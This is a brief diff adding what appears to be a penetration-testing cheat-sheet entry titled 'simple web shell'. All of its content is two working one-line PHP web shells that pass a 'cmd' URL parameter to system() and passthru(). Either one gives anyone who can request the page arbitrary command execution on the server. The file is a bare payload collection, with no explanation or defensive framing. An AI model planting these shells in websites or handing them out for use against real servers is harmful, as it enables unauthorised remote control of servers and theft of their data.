@@ -1,0 +1,7 @@
+% simple web shell (webshell)
+
+# get webshell
+<?php system($_GET['cmd']);?>
+
+# passthru webshell
+<?php echo passthru($_GET['cmd']);?>
